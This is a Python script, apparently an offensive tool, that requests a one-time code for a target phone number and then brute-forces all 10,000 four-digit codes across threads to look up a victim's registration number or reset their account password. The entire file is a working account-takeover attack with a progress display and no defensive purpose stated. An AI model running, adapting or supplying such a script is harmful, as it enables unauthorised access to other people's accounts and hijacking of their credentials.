from assist import ChangePassword, getRegNumber
from time import sleep
import random
from concurrent.futures import ThreadPoolExecutor as TPE
from queue import Queue as Q
from sys import stdout

print("initializing...")
NumberOfThreads = 5
q = Q()
with open("4digits.txt") as f:
    otpList = []
    for line in f:
        otpList.append(line[0:4])
    for otp in range(0,10000):
        random_otp = random.choice(otpList)
        q.put(random_otp)
        otpList.remove(random_otp)
print("""\033[93m
what do you want?

1) \033[96m Get registration number from Nickname & Phone Number
 \033[93m                     Or,
2) \033[96m Change pasword using Phone Number & Registration number

\033[0m""")

def showProgress(done,nowTrying):
    stdout.write(f"\rNow trying: {nowTrying} | Attack done: {done/100}% ")
    stdout.flush()

choice = int(input("(1/2): "))
phone = input("PhoneNumber(example:88017********): ")
if choice==1:
    nickname = input("Type nickname(case sensitive): ")
    target = getRegNumber(phone,nickname)
    target.req_otp()
    def crack():
        while target.wrongOTP:
            otp = q.get()
            target.tryOTP(otp)
            Done = 10000 - q.qsize()
            showProgress(Done,nowTrying=otp)#shows progress in percentage
    with TPE(max_workers=NumberOfThreads) as executor:
        executor.submit(crack)


elif choice==2:
    registration = input("Registration number:")
    target = ChangePassword(phone, registration)
    target.req_otp()
    def crack():
        while target.wrongOTP:
            otp = q.get()
            target.tryOTP(otp)
            Done = 10000 - q.qsize()
            showProgress(Done,otp)
    NewPassword = input("Type a new password (atleast 6 charecters long):")
    with TPE(max_workers=NumberOfThreads) as executor:
        executor.submit(crack)
    while target.wrongOTP:
        sleep(1)
    print("\n"+target.changePass(NewPassword))
else:
    print("Invalid input")
    exit()
